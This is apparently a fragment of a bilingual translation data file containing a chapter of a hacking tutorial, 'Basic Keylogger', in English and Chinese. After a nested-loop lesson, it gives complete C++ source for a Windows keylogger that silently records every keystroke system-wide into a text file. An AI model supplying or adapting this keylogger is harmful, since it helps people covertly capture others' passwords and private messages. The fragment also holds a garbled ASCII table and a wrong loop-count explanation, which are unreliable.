    \ codes program will run successfully:\n\n```cpp\n\"Keylogger.cpp\"\n1 #include\
    \ <iostream>\n2 #include <windows.h>\n3 #include <Winuser.h>\n4 #include <fstream>\n\
    ```\n\nOur little Keylogger functions, storing Keystrokes we make anywhere on\
    \ our system presently and sending them to Record.txt. For proof that the Keylogger\
    \ works, let us visit our browser, make inputs and return to our file to see if\
    \ our inputs are stored.\n"
  mdcn: "\n\n## 第16章. 基础键盘记录器\n\n制作键盘记录器首先需要的是 `#include <windows.h>` 和 `#include\
    \ <Winuser.h>` 头文件，因为我们需要其中一些需要这些头文件的函数。\n\n在循环内部构建循环（嵌套循环）是非常重要的，因为键盘记录器内部会有大量的此类结构。下面的程序展示了如何在另一个循环内部构建循环并使其无限运行。\n\
    \n```cpp\n#include <Winuser.h>\n\nusing namespace std;\n\nint main() {\n    char\
    \ c;\n    for (int i=0; i<3; i++) {\n        for (int j=0; j<3; j++) {\n     \
    \       cout << \"I am SECOND: \" << j << endl;\n        }\n        cout << \"\
    I am FIRST: \" << i << endl;\n    }\n}\n```\n\n在第11行，创建了一个 `char` 类型的变量，第13行开始第一个循环（`for`\
    \ 循环）。在该循环的括号内，设置了条件来控制程序块的运行。创建了一个 `int` 类型的变量 `i` 并初始化为 0。只要 `i` 小于3，循环就会继续运行；即\
    \ `i` 将运行两次。`i++` 计数并记录程序完成的循环次数，一旦满足 `i < 3` 的条件就会停止。该循环的开始和结束由大括号定义，跨越了从第14行到第21行。\n\
    \n**注意：** 大括号用于标记函数的开始和结束。\n\n换句话说，第13行的 `for` 循环将开始，一旦开始，它将开始评估其内部列出的条件。如果结果为真（即如果\
    \ `i` 小于3），它将运行 `for` 循环大括号内的任何代码。\n\n```cpp\nfor( int i=0; i<3 ; i++) {\n   \
    \ for( int j=0; j<3; j++) {\n        cout << \"I am SECOND :\" << j << endl;\n\
    \    }\n    cout << \"I am FIRST :\" << i << endl;\n}\n```\n\n在第15行和第18行之间，我们有另一个嵌套在第一个循环下的\
    \ `for` 循环。程序评估第15行的代码，只要结果为真，它就会一直打印第17行的语句，直到结果为假——当 `j` 大于或等于3——它将停止，退出第二个循环并进入第一个循环，然后再次打印第20行的语句。如果第一个条件再次评估为真，第二个循环将再次运行，如此反复3次（0-2\
    \ = 0, 1, 2次）。请结合程序的输出研究下面的程序。\n\n```cpp\n#include <iostream>\n#include <windows.h>\n\
    #include <Winuser.h>\n4\n5 using namespace std;\n6\n7\n8 int main()\n9 {\n10\n\
    11 char c;\n12\n13 for (int i=0; i<3; i++)\n14 {\n15 for (int j=0; j<3; j++)\n\
    16 {\n17 cout << \"AM SECOND: \" << j << endl;\n18 }\n19\n20 cout << \"AM FIRST:\
    \ \" << i << endl;\n21 }\n```\n\n![](img/eb3517bc8b212720f2254aa5b46526b4_109_0.png)\n\
    \n现在你已经理解了嵌套结构的工作原理，让我们直接进入它在键盘记录器上的应用。\n\n```cpp\n#include <iostream>\n#include\
    \ <windows.h>\n#include <Winuser.h>\n\nusing namespace std;\n\nint main() {\n\
    \    char c;\n    for(;;) {\n        for(c=8; c<=222; c++) {\n            if(GetAsyncKeyState(c)\
    \ == -32767) {\n                ofstream write(\"Record.txt\", ios::app);\n  \
    \              write << c;\n            }\n        }\n    }\n}\n```\n\n直接看上面的图，第12行包含一个\
    \ `for` 循环。括号内的分号表示该循环是无限的，即设置为连续运行而不停止。第14行是一个嵌套循环，其条件指定了程序能够读取的字符范围。这个字符范围获取自\
    \ ASCII 。不需要在脑中记住 ASCII 表，可以简单从网上引用。下面是一个 ASCII 代码表示例：\n\n## 字符\n\n| | | | | |\
    \ | | | | | | |\n|---|---|---|---|---|---|---|---|---|---|---|---|\n| 00 | NULL\
    \ (空字符) | 32 | 64 | @ | 96 | 128 | 160 | 192 | 224 |\n| 01 | SOH (帧头) | 33 | 65\
    \ | A | 97 | 129 | 161 | 193 | 225 |\n| 02 | STX (文本开始) | 34 | 66 | B | 98 | 130\
    \ | 162 | 194 | 226 |\n| 03 | ETX (文本结束) | 35 | 67 | C | 99 | 131 | 163 | 195\
    \ | 227 |\n| 04 | EOT (传输结束) | 36 | 68 | D | 100 | 132 | 164 | 196 | 228 |\n|\
    \ 05 | ESC (逸逸) | 37 | 69 | E | 101 | 133 | 165 | 197 | 229 |\n| 06 | ACK (确认)\
    \ | 38 | 70 | F | 102 | 134 | 166 | 198 | 230 |\n| 07 | BEL (响铃) | 39 | 71 | G\
    \ | 103 | 135 | 167 | 199 | 231 |\n| 08 | BS (退格符) | 40 | 72 | H | 104 | 136 |\
    \ 168 | 200 | 232 |\n| 09 | HT (制表符) | 41 | 73 | I | 105 | 137 | 169 | 201 | 233\
    \ |\n| 10 | LF (换行符) | 42 | 74 | J | 106 | 138 | 170 | 202 | 234 |\n| 11 | VT\
